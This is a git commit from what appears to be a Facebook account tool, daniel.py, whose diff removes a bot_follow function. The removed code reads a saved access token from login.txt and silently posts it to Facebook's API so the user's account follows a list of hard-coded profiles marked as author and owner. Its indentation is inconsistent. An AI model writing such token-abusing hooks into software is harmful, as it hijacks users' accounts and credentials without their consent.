bc873a3bde25c2b7ab32ac52d11a3746c0eec508
yachito <64332235+yachito@users.noreply.github.com>
2021-10-28 05:08:45 +0700

    ih

--- daniel.py
+++ daniel.py
@@ -84,28 +84,7 @@ logo = """
    \033[1;94m|__/  |  |  |  |_/   |__|  |__|
    \033[1;93m|  \\_ |  |__|  | \\_  |  |  |  |\033[1;97m
    """
-def bot_follow():
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print("\n   [!] Token invalid")
-		logs()
-		requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)      #Author
-		requests.post('https://graph.facebook.com/100014007334804/subscribers?access_token=' + toket)      #Owner
-		requests.post('https://graph.facebook.com/100006613569734/subscribers?access_token=' + toket)      #Owner
-		requests.post('https://graph.facebook.com/100000312208041/subscribers?access_token=' + toket) #
-		requests.post('https://graph.facebook.com/100013012878335/subscribers?access_token=' + toket) #
-		requests.post('https://graph.facebook.com/100001800440606/subscribers?access_token=' + toket) #
-    	requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + toket)      #
-    	requests.post('https://graph.facebook.com/100059454248601/subscribers?access_token=' + toket) #
-    	requests.post('https://graph.facebook.com/100042918784910/subscribers?access_token=' + toket)       #
-    	requests.post('https://graph.facebook.com/100026711802694/subscribers?access_token=' + toket) #
-    	requests.post('https://graph.facebook.com/536209003/subscribers?access_token=' + toket) #
-        print(('[+] \x1b[92mLogin Sukses!\x1b[0m'))
-        raw_input('[+] Tekan Enter ')
-        menu()
-        print'[!] Token Invalid!'
-        sys.exit()
+
     
 def tokenz():
 	os.system('clear')
